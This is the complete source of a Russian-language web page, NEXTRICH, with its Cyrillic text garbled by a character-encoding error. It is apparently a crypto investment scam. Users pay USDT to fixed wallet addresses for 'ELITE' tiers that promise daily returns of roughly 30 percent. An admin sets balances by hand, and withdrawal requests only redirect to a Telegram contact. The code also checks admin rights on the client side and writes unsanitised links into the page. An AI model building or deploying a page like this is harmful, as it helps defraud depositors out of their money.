<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>NEXTRICH</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{margin:0;font-family:Arial;background:#0b1020;color:#fff}
.hidden{display:none}
header{text-align:center;padding:14px;font-size:22px;background:#0f1533}
section{padding:16px 16px 110px}
.card{background:#151c3d;border-radius:14px;padding:14px;margin-bottom:12px}
input,select{width:100%;padding:10px;margin:6px 0;border-radius:10px;border:none}
button{padding:10px 14px;border-radius:12px;border:none;font-weight:bold;cursor:pointer}
.btn{background:#3b7cff;color:#fff}
.btn2{background:#1a245a;color:#9fc2ff}
nav{position:fixed;bottom:0;left:0;right:0;display:flex;background:#0f1533}
nav button{flex:1;background:none;color:#fff;border:none;padding:14px}
.elite{border:1px solid #3b7cff}
a{color:#7cc0ff;text-decoration:none}
.support{position:fixed;right:14px;bottom:78px;background:#25D366;
color:#000;padding:12px 14px;border-radius:50px;font-weight:bold}
.snow{pointer-events:none;position:fixed;inset:0}
</style>
</head>
<body>

<header>üéÑ NEXTRICH üíé</header>
<a class="support" href="https://t.me/Elite_rich7" target="_blank">üí¨ –ü–æ–¥–¥–µ—Ä–∂–∫–∞</a>

<canvas class="snow"></canvas>

<section id="auth">
  <div class="card">
    <h3>–í—Ö–æ–¥ / –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</h3>
    <input id="email" placeholder="Email">
    <input id="pass" type="password" placeholder="–ü–∞—Ä–æ–ª—å">
    <button class="btn" onclick="login()">–í–æ–π—Ç–∏ / –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</button>
  </div>
</section>

<section id="home" class="hidden">
  <div class="card">
    Email: <b id="uEmail"></b><br>
    –ë–∞–ª–∞–Ω—Å: <b><span id="bal">0</span> USDT</b><br>
    ELITE: <b id="eliteLvl">–ù–µ—Ç</b>
  </div>
</section>

<section id="elite" class="hidden"></section>

<section id="tasks" class="hidden">
  <div class="card">
    <h3>–ó–∞–¥–∞–Ω–∏—è</h3>
    <div id="taskList"></div>
  </div>
</section>

<section id="wallet" class="hidden">
  <div class="card">
    <h3>–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ</h3>
    <p>USDT TRC20: <b>TRSEFWAFve44VnGkpkYDvnDKCWXbGo3fHu</b></p>
    <p>USDT ERC20: <b>0x386a41769648b8daca0c63271dc533ea787d67ba</b></p>
    <p>USDT Polygon: <b>0x386a41769648b8daca0c63271dc533ea787d67ba</b></p>
    <p>LTC: <b>Lf73TtKAVHGHuYMv5VjXbMVe67YY4ssLN1</b></p>
  </div>
  <div class="card">
    <h3>–í—ã–≤–æ–¥</h3>
    <button class="btn2" onclick="withdraw()">–°–æ–∑–¥–∞—Ç—å –∑–∞—è–≤–∫—É</button>
  </div>
</section>

<section id="admin" class="hidden">
  <div class="card">
    <h3>–ê–¥–º–∏–Ω ‚Äî –ó–∞–¥–∞–Ω–∏–µ</h3>
    <input id="tLink" placeholder="YouTube —Å—Å—ã–ª–∫–∞">
    <input id="tReward" type="number" placeholder="–ù–∞–≥—Ä–∞–¥–∞ USDT">
    <button class="btn" onclick="addTask()">–î–æ–±–∞–≤–∏—Ç—å</button>
  </div>
  <div class="card">
    <h3>–ê–¥–º–∏–Ω ‚Äî –ë–∞–ª–∞–Ω—Å</h3>
    <input id="bEmail" placeholder="Email –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è">
    <input id="bAmount" type="number" placeholder="–ë–∞–ª–∞–Ω—Å">
    <button class="btn2" onclick="setBalance()">–ò–∑–º–µ–Ω–∏—Ç—å</button>
  </div>
</section>

<nav id="nav" class="hidden">
  <button onclick="show('home')">–î–æ–º</button>
  <button onclick="show('elite')">ELITE</button>
  <button onclick="show('tasks')">–ó–∞–¥–∞—á–∏</button>
  <button onclick="show('wallet')">–ë–∞–ª–∞–Ω—Å</button>
</nav>

<!-- Firebase compat -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
// ===== –ù–ê–°–¢–†–û–ô–ö–ò =====
const ADMIN_EMAIL = "admin@nextrich.com";
const firebaseConfig = {
  apiKey: "AIzaSyAZASnWfaygzD08v6dKOSrLPbR6GBQGSxw",
  authDomain: "nextrich-6fec6.firebaseapp.com",
  databaseURL: "YOUR_DATABASE_URL",
  projectId: "nextrich-6fec6",
  storageBucket: "nextrich-6fec6.appspot.com",
  messagingSenderId: "908180914494",
  appId: "1:908180914494:web:24640a5943ae00f1d9ec6f"
};
// =====================

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.database();

let user=null;

function login(){
  const e=email.value.trim(), p=pass.value.trim();
  if(!e||!p) return alert("–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ");
  auth.signInWithEmailAndPassword(e,p)
    .catch(()=>auth.createUserWithEmailAndPassword(e,p))
    .then(()=>start());
}

function start(){
  auth.onAuthStateChanged(u=>{
    if(!u) return;
    user=u;
    authSection(false);
    nav.classList.remove("hidden");
    uEmail.textContent=u.email;
    if(u.email===ADMIN_EMAIL) admin.classList.remove("hidden");
    ensureUser();
    renderElite();
    loadTasks();
    show("home");
  });
}

function authSection(show){ auth.classList.toggle("hidden", !show); }

function show(id){
  document.querySelectorAll("section").forEach(s=>s.classList.add("hidden"));
  document.getElementById(id).classList.remove("hidden");
  updateBal();
}

function ensureUser(){
  const ref=db.ref("users/"+uid());
  ref.once("value").then(s=>{
    if(!s.exists()) ref.set({balance:0,elite:0});
  });
}

function uid(){ return user.uid; }

function updateBal(){
  db.ref("users/"+uid()).once("value").then(s=>{
    const d=s.val()||{balance:0,elite:0};
    bal.textContent=d.balance;
    eliteLvl.textContent=d.elite?`ELITE ${d.elite}`:"–ù–µ—Ç";
  });
}

const ELITES=[
  {lvl:1,price:10,day:3},
  {lvl:2,price:50,day:16},
  {lvl:3,price:200,day:68},
  {lvl:4,price:600,day:216}
];

function renderElite(){
  elite.innerHTML="";
  ELITES.forEach(e=>{
    elite.innerHTML+=`
    <div class="card elite">
      <b>ELITE ${e.lvl}</b><br>
      –¶–µ–Ω–∞: ${e.price} USDT<br>
      –î–æ—Ö–æ–¥/–¥–µ–Ω—å: ${e.day} USDT<br><br>
      <button class="btn2" onclick="goPay(${e.lvl})">–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å</button>
    </div>`;
  });
}

function goPay(lvl){
  alert("–î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ø–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å. –ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –∞–¥–º–∏–Ω –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç ELITE.");
  show("wallet");
}

function addTask(){
  db.ref("tasks").push({link:tLink.value,reward:Number(tReward.value)});
  tLink.value=""; tReward.value="";
  alert("–ó–∞–¥–∞–Ω–∏–µ –¥–æ–±–∞–≤–ª–µ–Ω–æ");
}

function loadTasks(){
  db.ref("tasks").on("value", snap=>{
    taskList.innerHTML="";
    if(!snap.exists()) return taskList.innerHTML="–ó–∞–¥–∞–Ω–∏–π –Ω–µ—Ç";
    snap.forEach(s=>{
      const t=s.val();
      taskList.innerHTML+=`
      <div class="card">
        <a href="${t.link}" target="_blank">–û—Ç–∫—Ä—ã—Ç—å YouTube</a><br>
        –ù–∞–≥—Ä–∞–¥–∞: ${t.reward} USDT
      </div>`;
    });
  });
}

function setBalance(){
  const em=bEmail.value.trim(), amt=Number(bAmount.value);
  if(!em) return alert("Email?");
  db.ref("emailToUid/"+em).once("value").then(s=>{
    if(!s.exists()) return alert("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–æ–π–¥–∏—Ç–µ —Ö–æ—Ç—è –±—ã —Ä–∞–∑");
    db.ref("users/"+s.val()+"/balance").set(amt);
    alert("–ì–æ—Ç–æ–≤–æ");
  });
}

function withdraw(){
  alert("–ó–∞—è–≤–∫–∞ —Å–æ–∑–¥–∞–Ω–∞. –ù–∞–ø–∏—à–∏—Ç–µ –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É.");
  window.open("https://t.me/Elite_rich7","_blank");
}

// –°–≤—è–∑–∫–∞ email->uid
auth.onAuthStateChanged(u=>{
  if(u) db.ref("emailToUid/"+u.email).set(u.uid);
});

// —Å—Ç–∞—Ä—Ç
start();
</script>

<script>
// –ø—Ä–æ—Å—Ç—ã–µ —Å–Ω–µ–∂–∏–Ω–∫–∏
const c=document.querySelector('.snow'),x=c.getContext('2d');
function r(){c.width=innerWidth;c.height=innerHeight}r();onresize=r;
let s=[...Array(120)].map(()=>({x:Math.random()*c.width,y:Math.random()*c.height,r:1+Math.random()*2,v:.5+Math.random()}));
(function a(){x.clearRect(0,0,c.width,c.height);x.fillStyle="#fff";
s.forEach(o=>{x.beginPath();x.arc(o.x,o.y,o.r,0,7);x.fill();o.y+=o.v;if(o.y>c.height)o.y=0});
requestAnimationFrame(a)})();
</script>

</body>
</html>
